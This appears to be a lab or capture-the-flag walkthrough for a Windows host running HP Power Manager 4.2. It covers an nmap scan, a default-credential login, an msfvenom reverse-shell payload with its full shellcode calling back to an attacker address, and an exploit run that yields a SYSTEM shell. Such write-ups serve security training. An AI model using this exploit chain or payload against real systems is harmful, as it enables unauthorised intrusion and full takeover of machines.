##### Tags: `BOF`  `HP Power Manager` 

# 🪟 Kevin 🪟
## Enumeration
Nmap
```console
$ nmap -p- -T4 -sV 192.168.212.45

PORT      STATE    SERVICE       VERSION
80/tcp    open     tcpwrapped
135/tcp   open     msrpc         Microsoft Windows RPC
139/tcp   open     netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open     microsoft-ds  Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open     ms-wbt-server Microsoft Terminal Service
3573/tcp  open     tag-ups-1?
49152/tcp open     msrpc         Microsoft Windows RPC
49153/tcp open     msrpc         Microsoft Windows RPC
49154/tcp open     msrpc         Microsoft Windows RPC
49155/tcp open     msrpc         Microsoft Windows RPC
49158/tcp open     msrpc         Microsoft Windows RPC
49159/tcp open     msrpc         Microsoft Windows RPC
62156/tcp filtered unknown
Service Info: Host: KEVIN; OS: Windows; CPE: cpe:/o:microsoft:windows
```
port 80 is running HP Power Manager login page  
use default credential admin admin logged in and found the version is 4.2  
this version is vulnerable to Buffer Overflow attack  
```console
https://github.com/CountablyInfinite/HP-Power-Manager-Buffer-Overflow-Python3
```
generate the buffer overflow payload for revershell
```console
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.180 LPORT=22  EXITFUNC=thread -b '\x00\x1a\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5' x86/alpha_mixed --platform windows -f python

buf += "\x33\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e"
buf += "\x81\x76\x0e\x39\x8c\x95\xce\x83\xee\xfc\xe2\xf4"
buf += "\xc5\x64\x17\xce\x39\x8c\xf5\x47\xdc\xbd\x55\xaa"
buf += "\xb2\xdc\xa5\x45\x6b\x80\x1e\x9c\x2d\x07\xe7\xe6"
buf += "\x36\x3b\xdf\xe8\x08\x73\x39\xf2\x58\xf0\x97\xe2"
buf += "\x19\x4d\x5a\xc3\x38\x4b\x77\x3c\x6b\xdb\x1e\x9c"
buf += "\x29\x07\xdf\xf2\xb2\xc0\x84\xb6\xda\xc4\x94\x1f"
buf += "\x68\x07\xcc\xee\x38\x5f\x1e\x87\x21\x6f\xaf\x87"
buf += "\xb2\xb8\x1e\xcf\xef\xbd\x6a\x62\xf8\x43\x98\xcf"
buf += "\xfe\xb4\x75\xbb\xcf\x8f\xe8\x36\x02\xf1\xb1\xbb"
buf += "\xdd\xd4\x1e\x96\x1d\x8d\x46\xa8\xb2\x80\xde\x45"
buf += "\x61\x90\x94\x1d\xb2\x88\x1e\xcf\xe9\x05\xd1\xea"
buf += "\x1d\xd7\xce\xaf\x60\xd6\xc4\x31\xd9\xd3\xca\x94"
buf += "\xb2\x9e\x7e\x43\x64\xe4\xa6\xfc\x39\x8c\xfd\xb9"
buf += "\x4a\xbe\xca\x9a\x51\xc0\xe2\xe8\x3e\x73\x40\x76"
buf += "\xa9\x8d\x95\xce\x10\x48\xc1\x9e\x51\xa5\x15\xa5"
buf += "\x39\x73\x40\x9e\x69\xdc\xc5\x8e\x69\xcc\xc5\xa6"
buf += "\xd3\x83\x4a\x2e\xc6\x59\x02\xa4\x3c\xe4\x55\x66"
buf += "\x14\x38\xfd\xcc\x39\x8c\x83\x47\xdf\xe6\x85\x98"
buf += "\x6e\xe4\x0c\x6b\x4d\xed\x6a\x1b\xbc\x4c\xe1\xc2"
buf += "\xc6\xc2\x9d\xbb\xd5\xe4\x65\x7b\x9b\xda\x6a\x1b"
buf += "\x51\xef\xf8\xaa\x39\x05\x76\x99\x6e\xdb\xa4\x38"
buf += "\x53\x9e\xcc\x98\xdb\x71\xf3\x09\x7d\xa8\xa9\xcf"
buf += "\x38\x01\xd1\xea\x29\x4a\x95\x8a\x6d\xdc\xc3\x98"
buf += "\x6f\xca\xc3\x80\x6f\xda\xc6\x98\x51\xf5\x59\xf1"
buf += "\xbf\x73\x40\x47\xd9\xc2\xc3\x88\xc6\xbc\xfd\xc6"
buf += "\xbe\x91\xf5\x31\xec\x37\x75\xd3\x13\x86\xfd\x68"
buf += "\xac\x31\x08\x31\xec\xb0\x93\xb2\x33\x0c\x6e\x2e"
buf += "\x4c\x89\x2e\x89\x2a\xfe\xfa\xa4\x39\xdf\x6a\x1b"
```
run the script and got the system shell
```console
$ python3 hp_pm_exploit_p3.py 192.168.212.45 80 22
[+] HP Power Manager 'formExportDataLogs' Buffer Overflow Exploit
[+] Sending exploit to Ip 192.168.212.45 on port 80. Starting local listener on port 22
listening on [any] 22 ...
connect to [192.168.45.180] from (UNKNOWN) [192.168.212.45] 49170
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.


C:\Windows\system32>whoami
whoami
nt authority\system

```
